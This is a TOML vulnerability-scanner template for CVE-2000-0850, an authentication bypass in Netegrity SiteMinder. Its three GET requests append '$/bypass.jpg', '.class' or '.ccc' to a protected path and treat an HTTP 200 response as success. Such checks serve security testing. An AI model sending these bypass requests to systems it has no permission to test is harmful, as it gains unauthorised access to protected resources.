[info]
author = "ave"
description = "通过在受 SiteMinder 保护的 URL 末尾追加 $/FILENAME.ext（扩展名为 .jpg/.class/.ccc）验证是否可绕过认证访问受保护资源"
id = "POC-AVE-2000-0971"
name = "CVE-2000-0850 Netegrity SiteMinder 认证绕过 PoC"
severity = "high"
tags = [
    "cve-2000-0850",
    "siteminder",
    "auth-bypass",
]
vuln_id = [
    "CVE-2000-0850",
    "AVE-2000-0971",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/protected$/bypass.jpg"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/protected$/bypass.class"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/protected$/bypass.ccc"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
